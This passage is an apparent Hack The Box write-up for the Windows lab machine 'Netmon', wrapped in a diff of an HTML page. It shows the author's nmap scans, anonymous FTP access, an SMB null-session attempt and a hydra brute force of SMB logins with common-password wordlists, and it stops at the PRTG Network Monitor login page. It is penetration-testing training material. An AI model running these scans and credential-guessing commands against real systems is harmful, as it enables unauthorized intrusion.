@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Windows box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;netmon#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Netmon<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-11-07</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/netmon/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#host-10-10-10-152">Host 10.10.10.152</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#ftp">FTP</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#smb">SMB</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#prtg-network-monitor">PRTG Network Monitor</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#ftp-1">FTP</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#prtg-network-monitor-1">PRTG Network Monitor</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#foothold-cve-2018-9276">Foothold (CVE-2018-9276)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#hotfixes">Hotfixes</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#nics">NICs</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#flags">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/netmon/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2019-03-02</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/2984">mrb3n</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-152">Host <code>10.10.10.152</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Netmon using a TCP SYN <code>nmap</code>
+scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">21/tcp    open  ftp
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds
+</span><span class="z-text z-plain">5985/tcp  open  wsman
+</span><span class="z-text z-plain">47001/tcp open  winrm
+</span><span class="z-text z-plain">49664/tcp open  unknown
+</span><span class="z-text z-plain">49665/tcp open  unknown
+</span><span class="z-text z-plain">49666/tcp open  unknown
+</span><span class="z-text z-plain">49667/tcp open  unknown
+</span><span class="z-text z-plain">49668/tcp open  unknown
+</span><span class="z-text z-plain">49669/tcp open  unknown
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE
+</span><span class="z-text z-plain">123/udp  open|filtered ntp
+</span><span class="z-text z-plain">137/udp  open|filtered netbios-ns
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">5353/udp open|filtered zeroconf
+</span><span class="z-text z-plain">5355/udp open|filtered llmnr
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21,80,135,139,445,5985,47001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE      VERSION
+</span><span class="z-text z-plain">21/tcp    open  ftp          Microsoft ftpd
+</span><span class="z-text z-plain">80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+</span><span class="z-text z-plain">135/tcp   open  msrpc        Microsoft Windows RPC
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+</span><span class="z-text z-plain">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="z-text z-plain">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="z-text z-plain">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>123,137,138,500,4500,5353,5355<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE     VERSION
+</span><span class="z-text z-plain">123/udp  open|filtered ntp
+</span><span class="z-text z-plain">137/udp  open|filtered netbios-ns
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">5353/udp open|filtered zeroconf
+</span><span class="z-text z-plain">5355/udp open|filtered llmnr
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Netmon is running Windows, either
+Server 2008 R2 or Server 2012.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21,80,135,139,445,5985,47001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">21/tcp    open  ftp
+</span><span class="z-text z-plain">| ftp-syst: 
+</span><span class="z-text z-plain">|_  SYST: Windows_NT
+</span><span class="z-text z-plain">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span><span class="z-text z-plain">| 02-02-19  11:18PM                 1024 .rnd
+</span><span class="z-text z-plain">| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+</span><span class="z-text z-plain">| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+</span><span class="z-text z-plain">| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+</span><span class="z-text z-plain">| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+</span><span class="z-text z-plain">| 02-03-19  07:08AM       &lt;DIR&gt;          Users
+</span><span class="z-text z-plain">|_11-10-23  09:20AM       &lt;DIR&gt;          Windows
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">| http-title: Welcome | PRTG Network Monitor (NETMON)
+</span><span class="z-text z-plain">|_Requested resource was /index.htm
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds
+</span><span class="z-text z-plain">5985/tcp  open  wsman
+</span><span class="z-text z-plain">47001/tcp open  winrm
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">| smb-security-mode: 
+</span><span class="z-text z-plain">|   authentication_level: user
+</span><span class="z-text z-plain">|   challenge_response: supported
+</span><span class="z-text z-plain">|_  message_signing: disabled (dangerous, but default)
+</span><span class="z-text z-plain">| smb2-security-mode: 
+</span><span class="z-text z-plain">|   3:1:1: 
+</span><span class="z-text z-plain">|_    Message signing enabled but not required
+</span><span class="z-text z-plain">| smb2-time: 
+</span><span class="z-text z-plain">|   date: 2024-02-03T20:03:52
+</span><span class="z-text z-plain">|_  start_date: 2024-02-03T19:48:38
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP services.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>123,137,138,500,4500,5353,5355<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE
+</span><span class="z-text z-plain">123/udp  open|filtered ntp
+</span><span class="z-text z-plain">137/udp  open|filtered netbios-ns
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">5353/udp open|filtered zeroconf
+</span><span class="z-text z-plain">5355/udp open|filtered llmnr
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>ftp-anon</code> script reveals that the FTP server accepts anonymous connections.
+It also found a bunch of files typically corresponding to a Windows filesystem.</p>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="ftp">FTP</h3>
+<h4 id="exploring-the-filesystem">Exploring the filesystem</h4>
+<p>Thanks to <code>nmap</code>, we know that we can log in anonymously.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ftp <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Name (10.10.10.152:root): ftp
+</span><span class="z-text z-plain">331 Anonymous access allowed, send identity (e-mail name) as password.
+</span><span class="z-text z-plain">Password: 
+</span><span class="z-text z-plain">230 User logged in.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">ftp&gt;
+</span></code></pre>
+<p>As indicated by <code>nmap</code>, the FTP server contains many files and folders probably
+related to a Windows filesystem.</p>
+<p>Upon further enumeration of the content of this server, I found the user flag in
+<code>C:\Users\Public\Desktop</code>. However, I won't retrieve it just yet.</p>
+<p>This folder also contains <code>PRTG Enterprise Console.lnk</code> and
+<code>PRTG Network Monitor.lnk</code>, which are link files for PRTG apps... Let's keep
+that in mind.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>Exploring the content of the FTP server proved to be unsuccessful. But maybe
+it's vulnerable to known exploits?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>21<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vuln<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It isn't.</p>
+<h3 id="smb">SMB</h3>
+<h4 id="exploring-the-shares">Exploring the shares</h4>
+<p>Let's try to list the SMB shares with a NULL session, since we have no
+credentials at our disposal.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> smbclient<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>//10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>N</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">session setup failed: NT_STATUS_ACCESS_DENIED
+</span></code></pre>
+<p>It failed.</p>
+<p>Let's try common credentials then.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hydra<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>P</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>smb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">1 of 1 target completed, 0 valid password found
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It failed too.</p>
+<h4 id="known-vulnerabilities-1">Known vulnerabilities</h4>
+<p>We don't know the credentials to connect to the SMB server. But maybe it's
+vulnerable to known exploits?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.152<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>445<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vuln<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_smb-vuln-ms10-061: No accounts left to try
+</span><span class="z-text z-plain">|_smb-vuln-ms10-054: false
+</span><span class="z-text z-plain">|_samba-vuln-cve-2012-1182: No accounts left to try
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Sadly, it isn't.</p>
+<h3 id="prtg-network-monitor">PRTG Network Monitor</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.152/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/netmon/prtg-network-monitor-login-page.png" alt="PRTG Network Monitor login page" /></p>
+<p>It looks like a login page for PRTG Network Monitor. What's that?</p>
+<blockquote>
+<p>PRTG (Paessler Router Traffic Grapher until version 7) is a network monitoring
+software developed by Paessler AG. It falls under the broader Faessier PRTG
+product family and is designed to monitor system conditions like bandwidth
+usage or uptime and collect statistics from miscellaneous hosts such as
+switches, routers, servers, and other devices and applications.</p>
+<p>— <a href="https://en.wikipedia.org/wiki/Paessler_PRTG">Wikipedia</a></p>
+</blockquote>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/netmon/prtg-network-monitor-homepage-wappalyzer.png" alt="PRTG Network Monitor homepage Wappalyzer extension" /></p>
+<h4 id="exploration-1">Exploration</h4>
+<p>To access the functionalities of this application, we need to log in.</p>
